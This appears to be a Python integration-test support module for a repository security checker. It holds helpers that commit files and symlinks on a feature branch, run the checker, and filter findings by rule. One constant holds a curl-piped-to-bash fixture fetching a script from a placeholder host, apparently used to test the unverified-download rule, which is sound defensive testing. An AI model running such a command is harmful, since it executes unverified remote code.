import subprocess

from tests.integration.support import report

VULNERABLE = "security.vulnerable-dependency"
PARTIAL_SCAN = "security.partial-scan"
DOWNLOAD = "security.unverified-download"
PIPE = "curl https://x.example/i.sh | bash"


def findings_of(result, rule: str) -> list:
    return sorted(
        ((item["path"], item["line"]) for item in report(result)["findings"] if item["rule"] == rule),
        key=lambda found: (found[0], found[1] or 0),  # nocheck: clean.default-value -- a finding without a line sorts as line 0
    )


def feature_with_links(target, files: dict, links: dict) -> subprocess.CompletedProcess:
    """
    Args:
        target: Repository to commit into.
        files: Regular files a feature branch adds after a seed commit on main.
        links: Symlinks it adds, each with its target.

    Returns:
        `--base main --json` on that branch with the packaged rules.
    """
    target.write("seed.py", "x = 1\n")
    target.commit()
    target.git("checkout", "-q", "-b", "feature")
    for name, text in files.items():
        target.write(name, text)
    for name, destination in links.items():
        (target.path / name).symlink_to(destination)
    target.commit()
    return target.check("--base", "main", "--json")


def feature_check(target, files: dict) -> subprocess.CompletedProcess:
    """
    Args:
        target: Repository to commit into.
        files: Files a feature branch adds after a seed commit on main.

    Returns:
        `--base main --json` on that branch with the packaged rules.
    """
    return feature_with_links(target, files, {})
